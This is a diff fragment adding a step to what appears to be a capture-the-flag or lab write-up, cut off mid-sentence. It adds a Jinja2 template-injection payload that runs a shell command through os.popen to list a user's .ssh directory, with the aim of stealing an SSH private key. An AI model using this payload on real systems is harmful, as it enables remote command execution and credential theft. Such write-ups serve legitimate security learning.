@@ -243,3 +243,10 @@ Also a user called `ghill_sa`
 
 Since i know SSH is key based auth the likely next step is to read the private key
 
+```python
+{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('ls -la /home/ghill_sa/.ssh/')['read']()}}
+```
+Ill use this payload to read the contents in the .ssh dir
+
+![[Pasted image 20260317150737.png]]
+So viewing this in the source code was a
